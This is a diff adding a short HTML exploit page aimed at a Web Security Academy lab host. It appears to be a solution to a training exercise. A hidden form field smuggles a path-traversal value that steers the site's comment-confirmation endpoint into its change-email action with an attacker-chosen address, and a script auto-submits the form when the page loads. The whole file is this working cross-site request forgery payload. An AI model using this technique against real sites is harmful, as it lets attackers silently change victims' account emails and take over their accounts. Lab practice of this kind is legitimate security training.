@@ -1,0 +1,7 @@
+<!-- https://0a6d004803a4e610811820a700fb00b7.web-security-academy.net/post/comment/confirmation?postId=7 -->
+<form action="https://0a6d004803a4e610811820a700fb00b7.web-security-academy.net/post/comment/confirmation" method="get">
+    <input type="text" name="postId" hidden value="../../my-account/change-email?email=vuln%40pwn.net&submit=1">
+</form>
+<script>
+    document.forms[0].submit()
+</script>
